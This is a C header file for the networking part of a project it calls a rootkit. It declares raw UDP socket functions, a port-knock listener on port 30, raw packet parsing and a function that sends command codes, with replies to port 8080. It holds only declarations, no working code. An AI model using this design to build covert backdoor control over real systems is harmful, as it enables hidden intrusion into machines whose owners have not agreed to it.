#ifndef ROOTKIT_NETWORKING_H
#define ROOTKIT_NETWORKING_H

#define KNOCK_DEST_PORT 30

#include <stdint.h>
#include <stdio.h>
#include "protocol.h"

extern _Atomic uint16_t sequence_number;

#define REPLY_DEST_PORT 8080

// Socket creation functions
int create_udp_socket(void);
int create_raw_udp_socket(void);

// Socket binding functions
int bind_socket(int socket_fd, const struct client_options * client_options);
int bind_raw_socket(int socket_fd, char * ip_address);

// Network interface functions
char * get_local_address(void);
char * get_local_interface_name(void);

// Port knocking
int listen_port_knock(const struct client_options * client_options);

// Raw packet functions
void send_message(int socket_fd, const char * dest_ip, int port, const char * message);
struct packet_data * parse_raw_packet(const char *buffer, ssize_t n);
void send_command(int socket_fd, const char * dest_ip, int port, enum command_codes command);



#endif //ROOTKIT_NETWORKING_H